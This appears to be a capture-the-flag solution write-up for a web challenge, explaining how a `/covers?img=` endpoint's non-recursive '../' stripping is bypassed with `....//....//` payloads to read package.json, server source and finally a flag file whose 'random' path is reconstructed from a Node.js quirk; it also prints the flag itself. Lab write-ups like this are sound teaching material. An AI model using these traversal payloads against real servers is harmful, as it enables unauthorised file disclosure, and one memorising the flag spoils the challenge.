Source code should not be initially provided to the player for this challenge. However, package.json will mention the NodeJS version used in the Dockerfile (node:16.15.0-alpine), as the process.versions.v8 is dependent on using the correct NodeJS version.

# Step 1: Discovering LFI

To solve this challenge, check the network log to see requests to `/covers?img=${FILENAME}`. This GET request is vulnerable to a LFI filter bypass based on exploiting non-recursive stripping of the query.

Ex. `....//....//file.txt` can be used to access `../../file.txt`.

An interesting trick to discover the sanitization function is to make a GET request to `/covers?img[]=gatsby.jpg`, which returns an error message:

```
TypeError: img.replaceAll is not a function
    at /app/super_obvious_main_file_name.js:58:13
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at next (/app/node_modules/express/lib/router/route.js:144:13)
    at Route.dispatch (/app/node_modules/express/lib/router/route.js:114:3)
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at /app/node_modules/express/lib/router/index.js:284:15
    at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12)
    at next (/app/node_modules/express/lib/router/index.js:280:10)
    at jsonParser (/app/node_modules/body-parser/lib/types/json.js:110:7)
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
```

# Step 2: Using LFI to Find the Source Code

Using this exploit, the player will locate `/covers?img=....//....//package.json`. This will reveal the name of the main file (which would typically be `index.js`), `super_obvious_main_file_name.js`

Alternatively to get the filename `super_obvious_main_file_name.js`, you can make the application throw an error containing the filename by accessing a URL such as: `https://utoronto-ctf1-web-library.chals.io/covers?img=.\`

Using this exploit, the player will locate `/covers?img=....//....//index.js`.

Reading the source code, the player discovers an imported function, `SETUP`, from `./setup/setup.js`.

This file can be viewed by accessing `/covers?img=....//....//setup/setup.js`.

# Step 3: Finding The Flag Location

The `SETUP` function runs when the server starts, and moves the flag.txt file from the main application directory to a new path. At first, it appears that the path is random, because of the use of `crypto.randomBytes`. However, this function is not actually being called. So, the `.toString('hex')` call actually is returning the body of the function. The `.slice(0, 48)` is just taking the function name.

In the `package.json`, it's given that the version of NodeJS is:

```
"engines": {
    "node": "16.15.0"
  }
```

The user must use this version of NodeJS to get the correct result of `process.versions.v8` (that is, `9.4.146.24-node.20`).

Therefore, after importing the required dependencies, a player can use their terminal or a test project to run `"new_"+process.versions.v8+md5(btoa(crypto.randomBytes.toString("hex")).slice(0,48));` to produce the result:

`new_9.4.146.24-node.20bc5a5c11b6c1e4240f76c48501630e9e`

Using the same LFI technique as before, the player accesses: `/covers?img=....//....//new_9.4.146.24-node.20bc5a5c11b6c1e4240f76c48501630e9e/flag.txt` to obtain the flag: `uoft{N0T_S0_R4ND0M_EH?}`
